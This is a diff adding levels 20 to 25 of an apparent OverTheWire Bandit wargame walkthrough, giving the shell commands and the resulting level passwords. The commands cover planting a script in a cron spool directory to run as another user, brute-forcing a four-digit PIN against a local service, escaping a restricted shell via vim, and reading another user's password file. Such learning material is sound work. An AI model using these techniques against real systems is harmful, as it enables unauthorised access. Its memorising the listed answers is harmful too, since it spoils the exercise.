@@ -197,3 +197,65 @@ IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
 ```
 
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+### [Level 20](https://overthewire.org/wargames/bandit/bandit21.html)
+
+```sh
+echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l localhost -p 54321 &
+./suconnect 54321
+```
+
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+### [Level 21](https://overthewire.org/wargames/bandit/bandit22.html)
+
+```sh
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+### [Level 22](https://overthewire.org/wargames/bandit/bandit23.html)
+
+```sh
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+### [Level 23](https://overthewire.org/wargames/bandit/bandit24.html)
+
+```sh
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+vim /var/spool/bandit24/script.sh
+chmod 777 /var/spool/bandit24/script.sh
+cat /tmp/madscientist
+```
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+### [Level 24](https://overthewire.org/wargames/bandit/bandit25.html)
+
+```sh
+for i in $(seq -f "%04g" 0 9999); do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> /tmp/madscientist; done;
+cat /tmp/madscientist | nc localhost 30002 | grep password
+```
+
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+### [Level 25](https://overthewire.org/wargames/bandit/bandit26.html)
+
+```sh
+ssh -i bandit26.sshkey bandit26@localhost
+set shell=/bin/bash
+sh
+cat /etc/bandit_pass/bandit26
+```
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
